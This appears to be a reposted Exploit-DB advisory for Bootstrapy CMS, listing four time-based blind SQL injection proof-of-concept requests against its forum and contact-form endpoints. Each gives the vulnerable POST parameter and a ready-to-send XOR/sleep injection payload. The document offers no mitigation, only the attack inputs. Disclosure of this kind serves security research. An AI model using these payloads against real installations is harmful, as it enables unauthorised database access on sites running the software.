---
layout:     post
title:      "Bootstrapy CMS - Multiple SQL Injection"
date:       2019-03-21 12:35
author:     "Ahmet Ümit BAYRAM"
category:   exploit
tags:       [sql, sqli, sql injection, exploit-db]
---

# Exploit Title: Bootstrapy CMS - Multiple SQL Injection
# Date: 21.03.2019
# Exploit Author: Ahmet Ümit BAYRAM
# Vendor Homepage: http://bootstrapy.com
# Demo Site: http://bootstrapy.net/demo/
# Version: Lastest
# Tested on: Kali Linux
# CVE: N/A

----- PoC 1: SQLi -----

Request: http://localhost/[PATH]/modules/forums/forum-thread.php
Vulnerable Parameter: thread_id (POST)
Attack Patten:
search=&thread_id=0'XOR(if(now()=sysdate()%2Csleep(5)%2C0))XOR'Z

----- PoC 2: SQLi -----

Request: http://localhost/[PATH]/modules/pages/contact-submit.php
Vulnerable Parameter: subject (POST)
Attack Pattern:
email=sample%40email.tst&message=20&name=wUmrLVWz&subject=0'XOR(if(now()=sysdate()%2Csleep(5)%2C0))XOR'Z&submit=

----- PoC 3 - SQLi -----

Request: http://localhost/[PATH]/modules/forums/post-new-submit.php
Vulnerable Parameter: post-id
Attack Pattern:
body=1&post-id=0'XOR(if(now()=sysdate()%2Csleep(5)%2C0))XOR'Z&quote=1&submit=&thread-id=1

----- PoC 4 - SQLi -----

Request: http://localhost/[PATH]/modules/forums/post-new-submit.php
Vulnerable Parameter: thread-id (POST)
Attack Pattern:
quote=0&reply=1&submit=&thread-id=0'XOR(if(now()=sysdate()%2Csleep(0)%2C0))XOR'Z
